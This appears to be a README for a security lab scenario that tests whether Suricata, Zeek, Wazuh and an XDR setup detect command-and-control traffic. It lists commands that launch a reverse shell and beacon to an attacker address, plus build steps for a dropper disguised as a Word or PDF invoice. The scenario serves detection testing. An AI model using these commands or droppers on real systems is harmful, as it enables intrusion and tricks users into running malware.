# C2 Outbound Connection - C2 Connection Testing

## Description

This scenario simulates the **Application Layer Protocol (T1071)** technique from the MITRE ATT&CK framework. It represents the post-compromise phase where malware has successfully infiltrated a victim's machine and begins establishing a covert communication channel (C2 Channel) to the command and control server.

## MITRE ATT&CK Techniques

| ID        | Technique                      | Script                       |
| --------- | ------------------------------ | ---------------------------- |
| T1071     | Application Layer Protocol     | `c2_reverse_shell.py`        |
| T1204.002 | User Execution: Malicious File | `dropper.py`                 |
| T1036.005 | Masquerading                   | `dropper.py` (fake document) |

## Testing Objectives

- Verify the ability of **Suricata/Zeek** to monitor outbound network traffic
- Evaluate the ability of **Wazuh Agent** to detect abnormal process network connections on endpoints
- Validate the automated response capabilities of **SmartXDR**

## Test Configuration

| Role                 | Machine    | IP               | Tool          |
| -------------------- | ---------- | ---------------- | ------------- |
| Attacker (C2 Server) | Kali Linux | `192.168.71.100` | `netcat`      |
| Victim               | Windows 11 | `192.168.85.150` | Python script |

---

## 1. C2 Reverse Shell (`c2_reverse_shell.py`)

### Interactive Shell Mode
```bash
python c2_reverse_shell.py --host 192.168.71.100 --port 80
```

### Beacon Mode
```bash
python c2_reverse_shell.py --host 192.168.71.100 --port 80 --beacon
```

### IOC Trigger Mode (Read from file)
```bash
python c2_reverse_shell.py --ioc-file malicious_ip.txt
```

---

## 2. Fake Document Dropper (`dropper.py`)

Simulates the User Execution technique - user "accidentally" runs an .exe file disguised as a document.

### How it works
1. User clicks on `Invoice_2024.exe` file (with Word icon)
2. File opens a fake document (HTML invoice) in browser
3. Simultaneously, C2 payload runs silently in background
4. Detection system records the outbound connection

### Build Dropper
```bash
# Build with Word icon
python build.py dropper

# Build with PDF icon
python build.py dropper-pdf
```

### Output
```
dist/dropper/Invoice_2024.exe        # Fake Word document
dist/dropper-pdf/Report_Q4_2024.exe  # Fake PDF document
```

---

## CLI Parameters

| Parameter       | Description                     | Default            |
| --------------- | ------------------------------- | ------------------ |
| `-H, --host`    | C2 Server IP                    | `192.168.71.100`   |
| `-p, --port`    | C2 Server Port                  | `80`               |
| `--ioc-file`    | File containing malicious IPs   | `malicious_ip.txt` |
| `--timeout`     | Timeout for IOC trigger (sec)   | `3`                |
| `--delay`       | Delay between connections (sec) | `1.0`              |
| `-v, --verbose` | Show detailed logs              | `False`            |

---

## Deploy Zeek Detection

```bash
# Copy Zeek script
cp c2_detection.zeek /opt/zeek/share/zeek/site/

# Add to local configuration
echo '@load base/frameworks/signatures' >> /opt/zeek/share/zeek/site/local.zeek
echo '@load-sigs ./c2_detection.zeek' >> /opt/zeek/share/zeek/site/local.zeek

# Deploy
zeekctl deploy
```

## Expected Results

### Detection Systems:
- **Suricata/Zeek**: Records TCP connection from `192.168.85.150` -> `192.168.71.100:80`
- **Wazuh Agent**: Records Sysmon Event ID 3 (Network Connection)
- **MISP Integration**: Matches destination IP with IoC database

### Automated Response:
- **pfSense**: Block IP `192.168.71.100`
- **Wazuh Active Response**: Isolate Windows 11 machine
- **DFIR-IRIS**: Create new Case
- **Telegram**: Send alert notification

---

## Warning

> **FOR SECURITY TESTING PURPOSES ONLY**
> 
> This script simulates malware behavior. Unauthorized use may violate the law.
